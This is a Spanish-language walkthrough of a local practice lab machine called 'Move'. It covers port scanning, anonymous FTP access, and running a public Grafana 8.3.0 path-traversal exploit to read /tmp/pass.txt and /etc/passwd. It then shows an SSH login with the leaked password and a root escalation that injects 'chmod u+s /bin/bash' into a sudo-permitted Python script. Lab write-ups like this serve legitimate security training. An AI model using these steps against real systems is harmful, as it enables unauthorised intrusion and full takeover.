- Tags: #move 
---
[Maquina Move](https://mega.nz/file/MKMzkSRA#UCxX3Ns2Ew_YQlayKPyyi6rmQrRbySxC7hhpWJfMoy8) ==> Enlace de descarga al laboratorio.
```bash
7z x move.zip # Descomprimimos el archivo.
sudo bash auto_deploy.sh move.tar # Desplegamos el laboratorio.
```

#### Fase Reconocimiento:
```bash
172.17.0.2 # Direccion IP del target.
ping -c 1 172.17.0.2 # Lanzamos una traza ICMP para determinar si tenemos conectividad con el target
wihcSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux.
172.17.0.2 (ttl -> 64): Linux
```

#### Fase Reconocimiento Puertos:
```bash
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos escaneo de puertos.
scanerTCPV2.py -t 172.17.0.2 -p 1-5000 # Nuestra herramienta detecta los mismos puertos.
extractPorts allPorts # Parseamos la informacion mas relevante de el primer escaneo.
nmap -sC -sV -p21,22,80,3000 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos.
```

**( 21/tcp   open  ftp     vsftpd 3.0.3 )** ==> Tenemos este servicio expuesto, 
```bash
nmap --script ftp-anon.nse -p 21 172.17.0.2 # Para este servicio detectamos que es posible conectarnos con el usuario anonymous sin proporcionar password.

ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0            4096 Mar 29  2024 mantenimiento [NSE: writeable] # Al paracer tenemos un archivo o directorio, con capacidad de escritura
```

**( 22/tcp   open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0) )** ==> Tenemos un servicio ssh expuesto, El cual si existen credenciales filtradas podremos usar para loguearnos.
**( 80/tcp   open  http    Apache httpd 2.4.58 ((Debian)) )** ==> Tenemos un servicio web expuesto.
**( 3000/tcp open  http    Grafana http )** ==> Tenemos este servicio expuesto, Grafana es una plataforma interactiva y dinámica de código abierto que se utiliza para **visualizar, almacenar, analizar y comprender datos**, especialmente aquellos relacionados con métricas de rendimiento de aplicaciones y sistemas IT. Es decir, te permite crear dashboards interactivos y personalizables para monitorear y entender mejor la información

#### Fase Enumeracion FTP:
```bash
ftp 172.17.0.2 # Nos conectamos con el usuario: ( anonymous ) y sin proporcionar contrasena.
mantenimiento: # Adrento de este directorio tenemos el siguiente archivo: ( database.kdbx )
get database.kdbx # Nos descargamos este archivo
```
Si buscamos en internet vemos que el archivo **database.kdbx** se puede desencriptar con [Keepassxc](https://keepassxc.org/).
Si recordamos, nos salía haciendo **fuzzing** un archivo llamado **maintenance.html**, en el que dice que el sitio web está en mantenimiento, que acceda a **/tmp/pass.txt**.

#### Fase Reconocimiento Web:
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
whatweb http://172.17.0.2 # No reporta nada critco
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,back,txt,html,css,js # Realizamos descubrimiento de archivos en el servidor.
```

**( http://172.17.0.2/maintenance.html )** ==> Tenemos un archivo expuesto, Sitio web en mantenimiento, el acceso está en /tmp/pass.txt
**( http://172.17.0.2:3000/login )** ==> Tenemos **Grafana** con una version: **( v8.3.0 )** el cual buscaremos un exploit para esa version
```bash
searchsploit grafana 8.3.0 # Encontramos un exploit para esta version que contempla un DirecotryPathTraversal
searchsploit -x multiple/webapps/50581.py  # vemos su contenido para ver como aplicarlo, Donde solo tendremos que pasarle el directorio a aplicar el LFI, atraves de in input
searchsploit -m multiple/webapps/50581.py # Nos descargamos este exploit
python3 50581.py -H http://172.17.0.2:3000 # Lo ejecutamos indicando que queremos ver el contenido del archivo: ( /tmp/pass.txt )

t9sH76gpQ82UFeZ3GXZS # Obtuvimos este hast que tendremos que determinar de que tipo es para aplicar fuerza bruta. Al parecer es texto
freddy:x:1000:1000::/home/freddy:/bin/bash # Al listar el ( /ect/passwd ) vemos que existe ese usuario asi que probaremos si podemos loguearnos por ssh con ese usaurio y password
```

#### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh freddy@172.17.0.2 # Despues proporcionamos la password: ( t9sH76gpQ82UFeZ3GXZS )
```

#### Fase Escalada Privilegios:
```bash
sudo -l
User freddy may run the following commands on c26ed76529ad:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py # Tenemos una via potencial de elevar privilegios.
```

**Nota:** ==> Nos aprovechamos que nosotros somos los duenos de este archivo para modificarlo y inyectar codigo maliciosa para que se asignen privielgios **SUID** a la bash
```bash
maintenance.py # Este archivo modificamos

import os;
os.system("chmod u+s /bin/bash")
print("Hacked")
```

```bash
sudo -u root /usr/bin/python3 /opt/maintenance.py 
Hacked # Resultado de la ejecucion
```

```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1277936 Nov 26  2023 /bin/bash # Logramos cambiarle los permisos a la bash.
```

```bash
 bash -p # Ahora obtendremos un bash como root. Logrando tener control total sobre el target.
```